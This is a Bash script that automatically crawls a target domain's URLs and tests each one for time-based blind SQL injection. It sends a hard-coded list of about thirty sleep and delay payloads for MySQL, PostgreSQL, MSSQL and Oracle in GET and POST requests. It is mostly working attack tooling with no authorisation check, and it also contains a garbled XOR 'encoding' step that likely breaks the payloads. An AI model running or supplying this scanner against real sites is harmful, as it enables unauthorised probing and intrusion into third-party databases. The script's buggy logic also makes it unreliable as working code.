#!/bin/bash

# XOR encoding function
xor_payload() {
  local input="$1"
  local key="secret"  # Replace with your XOR key
  local output=""
  
  for (( i=0; i<${#input}; i++ )); do
    local input_char=$(printf "%d" "'${input:$i:1}")
    local key_char=$(printf "%d" "'${key:$((i % ${#key}))}:1")
    output+=$(printf "%02x" "$(( input_char ^ key_char ))")
  done
  echo "$output"
}

# Top 30 Advanced Blind SQLi Payloads for inducing a delay of 10 seconds
default_payloads=(
  "1' AND IF(1=1, SLEEP(10), 0)-- -"          
  "1' AND IF(1=1, BENCHMARK(10000000, MD5(1)), 0)-- -" 
  "1' OR (SELECT SLEEP(10) FROM DUAL)-- -"    
  "1); SELECT pg_sleep(10)--"                  
  "1' AND (SELECT PG_SLEEP(10))--"              
  "1'; WAITFOR DELAY '00:00:10'--"             
  "1' AND (SELECT DBMS_LOCK.SLEEP(10) FROM dual)--" 
  "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0-- -" 
  "1' AND (SELECT SLEEP(10) WHERE 'a'='a')-- -" 
  "1' OR 1=1 AND SLEEP(10)-- -"                 
  "1' UNION SELECT SLEEP(10) -- -"               
  "1' AND '1'='1' AND (SELECT SLEEP(10))-- -"   
  "1' OR EXISTS(SELECT * FROM (SELECT SLEEP(10))a)-- -" 
  "1' OR (SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)-- -" 
  "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(10))-- -" 
  "1' AND (SELECT IF(1=1, SLEEP(10), 0))-- -"   
  "1' AND (SELECT IF(1=2, SLEEP(10), 0))-- -"    
  "1' AND (SELECT SLEEP(10) WHERE (SELECT COUNT(*) FROM users) > 0)-- -" 
  "1' AND (SELECT IF(1=1, SLEEP(10), 0))-- -"    
  "1' OR (SELECT SLEEP(10) FROM DUAL)-- -"      
  "1' AND (SELECT SLEEP(10) WHERE '1'='1')-- -"  
  "1' OR (SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)-- -" 
  "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(10))-- -" 
  "1' AND (SELECT IF(1=2, SLEEP(10), 0))-- -"    
  "1' AND (SELECT SLEEP(10) WHERE '1'='1')-- -"  
  "1' OR (SELECT SLEEP(10) FROM DUAL)-- -"      
  "1' AND (SELECT IF(1=1, SLEEP(10), 0))-- -"    
  "1' AND (SELECT 1 FROM DUAL WHERE (SELECT SLEEP(10)))-- -" 
  "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(10) ELSE 0 END)-- -" 
)

# Threshold for response time in seconds
threshold=10

# Clear the results file
echo "" > results.txt

# Temporary files
urls_file="all_urls.txt"
params_file="params.txt"
echo "" > $urls_file
echo "" > $params_file

# Function to gather URLs and JavaScript parameters
gather_urls_and_params() {
  local domain="$1"
  
  # Gather URLs using tools
  urls=$(gau -subs "$domain" | gauplus | katana | hakrawler)
  if [[ -z "$urls" ]]; then
    echo "No URLs found for $domain"
    exit 1
  fi
  echo "$urls" >> $urls_file
  
  # Gather JavaScript URLs and extract parameters
  echo "$urls" | grep '\.js$' | while read js_url; do
    params=$(curl -s "$js_url" | grep -oP '(?<=\=)[^&]+')
    for param in $params; do
      echo "${js_url}?${param}=" >> $params_file
    done
  done
}

# Function to test SQLi on gathered URLs with both GET and POST methods
test_sql_injection() {
  local payloads=("$@")
  cat $urls_file | while read url; do
    for payload in "${payloads[@]}"; do
      encoded_payload=$(xor_payload "$payload")
      
      # Test GET request
      test_url="${url}${encoded_payload}"
      response_time=$(curl -s -o /dev/null -w '%{time_total}\n' "$test_url")
      
      if (( $(echo "$response_time >= $threshold" | bc -l) )); then
        echo -e "\033[32mVULNERABLE (GET): $test_url (Payload: $payload)\033[0m"
        echo "VULNERABLE (GET): $test_url (Payload: $payload)" >> results.txt
      else
        echo -e "\033[31mNOT VULNERABLE (GET): $test_url (Payload: $payload)\033[0m"
      fi

      # Test POST request
      post_data="input=${encoded_payload}"
      post_response_time=$(curl -s -o /dev/null -w '%{time_total}\n' -X POST -d "$post_data" "$url")
      
      if (( $(echo "$post_response_time >= $threshold" | bc -l) )); then
        echo -e "\033[32mVULNERABLE (POST): $url (Payload: $payload)\033[0m"
        echo "VULNERABLE (POST): $url (Payload: $payload)" >> results.txt
      else
        echo -e "\033[31mNOT VULNERABLE (POST): $url (Payload: $payload)\033[0m"
      fi
    done
  done
}

# Parse command-line arguments
while getopts ":d:l:p:" opt; do
  case ${opt} in
    d)
      domain=$OPTARG
      gather_urls_and_params "$domain"
      test_sql_injection "${default_payloads[@]}"
      ;;
    l)
      while read subdomain; do
        gather_urls_and_params "$subdomain"
      done < "$OPTARG"
      test_sql_injection "${default_payloads[@]}"
      ;;
    p)
      IFS=',' read -r -a custom_payloads <<< "$OPTARG"
      if [ ${#custom_payloads[@]} -gt 10 ]; then
        echo "Error: You can provide a maximum of 10 payloads."
        exit 1
      fi
      test_sql_injection "${custom_payloads[@]}"
      ;;
    \?)
      echo "Invalid option: $OPTARG" 1>&2
      ;;
    :)
      echo "Invalid option: $OPTARG requires an argument" 1>&2
      ;;
  esac
done
